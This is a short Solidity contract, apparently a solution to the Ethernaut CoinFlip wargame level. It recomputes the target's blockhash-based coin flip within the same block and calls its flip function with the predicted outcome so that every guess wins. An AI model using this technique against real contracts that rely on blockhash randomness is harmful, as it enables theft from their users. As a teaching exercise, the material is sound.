// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @dev This contract is here to hack the CoinFlip contract of Ethernaut,
/// pseudo random calcul resolved on blockchain can be easily calculated 
/// by other smart contract before interacting... In this case I will just
/// calculate the result with the same exact fct and send a message call to the contract
/// with my result and the CoinFlip will find the same so I will win!
contract HackCoinFlip {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address coinFlipToHack;

    constructor(address _coinFlipToHack) {
        coinFlipToHack = _coinFlipToHack;
    }

    function guessAndFlip() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        (bool success,) = coinFlipToHack.call(abi.encodeWithSignature("flip(bool)", side));
        require(success);
    }
}